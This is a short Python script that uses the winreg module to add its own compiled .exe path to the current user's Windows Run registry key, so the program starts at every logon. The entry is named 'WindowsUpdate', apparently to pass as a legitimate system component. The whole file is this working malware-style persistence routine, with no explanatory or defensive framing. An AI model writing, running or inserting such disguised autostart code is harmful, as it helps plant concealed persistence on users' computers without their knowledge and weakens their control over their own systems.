from os import path
from winreg import *
   
PathFile = path.abspath((__file__)[:-2]+'exe')
print(PathFile)

StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',0, KEY_ALL_ACCESS)
SetValueEx(StartupKey, 'WindowsUpdate', 0, REG_SZ, PathFile)
CloseKey(StartupKey)
